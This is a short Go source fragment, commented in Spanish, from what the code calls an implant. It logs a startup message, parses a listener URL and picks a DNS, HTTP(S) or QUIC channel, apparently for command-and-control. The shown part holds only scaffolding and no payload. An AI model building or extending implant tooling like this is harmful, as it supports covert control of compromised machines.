func debugLog(format string, args ...any) {
	if !debugEnabled {
		return
	}
	ts := time.Now().UTC().Format("2006-01-02T15:04:05.000Z")
	fmt.Fprintf(os.Stderr, "[rtc2 %s] %s\n", ts, fmt.Sprintf(format, args...))
}

func fatalExit(reason string, err error) {
	if err != nil {
		debugLog("FATAL: %s: %v", reason, err)
	} else {
		debugLog("FATAL: %s", reason)
	}
	os.Exit(1)
}

// truncate devuelve los primeros n caracteres de s, con "..." si se truncó.
func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func main() {
	debugLog("arrancando implante build=%s listener=%s profile=%s",
		BuildID, ListenerURL, ProfileName)

	u, err := url.Parse(ListenerURL)
	if err != nil || u.Scheme == "" {
		fatalExit("ListenerURL inválida", err)
	}

	switch u.Scheme {
	case "dns":
		runDNS()
	case "http", "https":
		runHTTP()
	case "quic":
		runQUIC()
	default:
		fatalExit("esquema no soportado: "+u.Scheme, nil)
	}
}

